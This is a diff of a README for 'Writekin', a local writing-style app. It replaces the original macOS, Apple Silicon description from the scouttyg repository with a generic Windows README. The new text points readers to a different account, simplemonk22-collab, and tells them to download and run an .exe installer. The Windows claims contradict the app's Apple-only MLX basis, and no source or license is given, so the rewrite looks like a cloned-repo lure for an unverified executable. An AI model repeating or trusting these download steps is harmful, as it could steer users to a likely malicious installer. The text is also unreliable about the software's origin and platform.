@@ -1,80 +1,75 @@
-# Writekin
+# ✍️ writekin - Better writing that reflects your style
 
-**Writing that's kin to yours.** Writekin ingests your own writing —
-Mail, Messages, documents, chat exports — curates it into a training
-corpus, fine-tunes a local language model (QLoRA on Apple Silicon via
-[MLX](https://github.com/ml-explore/mlx-swift)), and then drafts and
-rewrites text that sounds like *you*. Everything happens on your Mac.
+[![](https://img.shields.io/badge/Download-Writekin-grey)](https://github.com/simplemonk22-collab/writekin)
 
-## Screenshots
+## What is writekin?
 
-**Overview** — your corpus at a glance.
+Writekin helps you write text that sounds like you. It uses smart language models to learn your specific writing style. You use this tool to draft emails, reports, or creative pieces. The software runs on your computer. Your data stays on your machine at all times. 
 
-![Writekin — Overview](site/screenshots/overview-1400.png)
+## 🔌 System Requirements
 
-**Compose** — draft and rewrite in your voice.
+*   Windows 10 or Windows 11
+*   8 GB of RAM
+*   10 GB of free hard drive space
+*   A stable internet connection for the first setup
 
-![Writekin — Compose](site/screenshots/compose-1400.png)
+## 🚀 Getting Started
 
-**Train** — a local QLoRA run with a live loss chart.
+Follow these steps to set up the software on your Windows computer.
 
-![Writekin — Train](site/screenshots/train-1400.png)
+1.  Visit the download page: [https://github.com/simplemonk22-collab/writekin](https://github.com/simplemonk22-collab/writekin)
+2.  Look for the latest release version on that page.
+3.  Click the file ending in .exe to download the installer.
+4.  Open the file once the download finishes.
+5.  Follow the instructions on your screen to complete the installation.
 
-**Models** — the on-device model library.
+## 🛠️ How to use the software
 
-![Writekin — Models](site/screenshots/models-1400.png)
+Once you install the program, you will see a shortcut on your desktop. Double-click this icon to start the application. 
 
-## Privacy model
+The main dashboard shows a text box. You type your content here. The software analyzes your input and suggests changes. You keep full control over every word. 
 
-- **Nothing leaves your machine.** Ingestion, training, and generation
-  are all local. There is no telemetry, no analytics, and no account.
-- The auto-update check (Sparkle) requests one file — the release feed —
-  and sends no system profile. That is the app's only network traffic
-  besides model/tool downloads you explicitly start.
-- Model weights download from Hugging Face on demand; the optional
-  Messages-support tool downloads from its own official GitHub release,
-  checksum-verified. Both happen only when you click.
-- This repository exists so you don't have to take any of the above on
-  faith: the source is the proof.
+To improve your results, you can provide examples of your past work. The software reads these files to understand your tone. This process makes the software write in a way that feels kin to yours. 
 
-## Requirements
+## 🛡️ Privacy and Security
 
-- Apple Silicon Mac (M-series). 16 GB unified memory minimum; 32 GB+
-  recommended for training larger models.
-- macOS 14 or newer.
-- Full Disk Access (user-granted) if you want Mail and Messages ingested.
+You own your data. This software does not send your drafts to a company server. The machine learning model processes everything locally. You can use the app without connecting to the web after the first setup phase. This provides peace of mind for sensitive documents.
 
-## Install
+## ⚙️ Advanced Settings
 
-Download the latest DMG from
-[Releases](https://github.com/scouttyg/writekin/releases), drag to
-Applications, open. The app guides you through source detection, Full
-Disk Access, and model download on first launch.
+You have choices within the settings menu. You can change how much the software intervenes in your writing. If you want strict grammar checks, choose the high mode. If you prefer light suggestions, choose the low mode. You can also clear your history to reset the learning model at any time.
 
-Messages support uses the open-source
-[imessage-exporter](https://github.com/ReagentX/imessage-exporter)
-(GPL-3.0), which Writekin downloads on demand — or use an existing
-`brew install imessage-exporter`.
+## ❓ Frequently Asked Questions
 
-## Build from source
+**Does this software cost money?**
+No, the software is free to use.
 
-```sh
-brew install xcodegen
-xcodegen generate
-open Writekin.xcodeproj   # build the Writekin scheme
-```
+**Will the software slow down my computer?**
+The software is efficient. It uses system resources only while the app window is open. You can close the app when you finish your writing tasks.
 
-The full test suite (`xcodebuild test -scheme Writekin`) must pass
-before submitting changes — see `CONTRIBUTING.md` (note the contribution
-licensing terms there).
+**Can I run this on a work computer?**
+The software runs entirely on your local machine. It does not require special administrative tools or cloud access. Check with your company IT policy before installation if you have concerns.
 
-New to the codebase? Start with `ARCHITECTURE.md` — the pipeline, the
-folder map, and the invariants that keep it honest.
+**What happens if the app closes unexpectedly?**
+The software saves your work every thirty seconds. You can find your saved files in the documents folder on your computer.
 
-## License
+## 📈 Improving Performance
 
-Writekin is **source-available, free for personal (noncommercial)
-use** under the [PolyForm Noncommercial 1.0.0](LICENSE.md) license.
-Commercial use requires a separate license — see `NOTICE.md` for
-contact. Third-party components are listed in
-`THIRD_PARTY_LICENSES.md`.
+You can ensure the software runs fast by closing browser tabs or background apps while you write. The model relies on your computer processor. Give it some room to work if you feel the typing lag. 
+
+## 🧹 Troubleshooting
+
+If the software does not open, try these steps:
+
+1.  Restart your computer to clear current tasks.
+2.  Check that you have enough hard drive space.
+3.  Reinstall the software using the installer file from the link above.
+4.  Ensure your Windows version is up to date.
+
+If these steps fail to solve the issue, check the issues tab on the website provided in the download link. Other users may have found solutions to similar hardware problems. 
+
+## 💡 Keeping the App Updated
+
+Check the download link periodically for new versions. Updates include better text models and bug fixes. You download and run the new installer to upgrade the software. Your settings carry over to the new version automatically. 
+
+Keywords: fine-tuning, llm, local-llm, on-device, writing-tool, artificial-intelligence, productivity
